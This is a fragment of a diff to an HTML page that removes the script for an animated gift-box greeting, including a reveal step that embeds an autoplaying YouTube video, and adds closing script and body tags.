-    merrywrap.className='merrywrap step-'+step;
-  }
-  function openBox(){
-    if(step===1){
-      box.removeEventListener("click",openBox,false); 
-    }  
-    stepClass(step); 
-    if(step===3){ 
-    } 
-    if(step===4){
-        reveal();
-       return;
-    }     
-    setTimeout(openBox,stepMinutes[step-1]);
-    step++;  
-  }
-   
-  init();
- 
-}
-
-function reveal() {
-  document.querySelector('.merrywrap').style.backgroundColor = 'transparent';
-  
-  loop();
-  
-  var w, h;
-  if(window.innerWidth >= 1000) {
-    w = 295; h = 185;
-  }
-  else {
-    w = 255; h = 155;
-  }
-  
-  var ifrm = document.createElement("iframe");
-        ifrm.setAttribute("src", "https://www.youtube.com/embed/KDxJlW6cxRk?controls=0&loop=1&autoplay=1");
-        //ifrm.style.width = `${w}px`;
-        //ifrm.style.height = `${h}px`;
-        ifrm.style.border = 'none';
-        document.querySelector('#video').appendChild(ifrm);
-}
-      </script>
+        </script>
+      </body>    
 </body>
 </html>
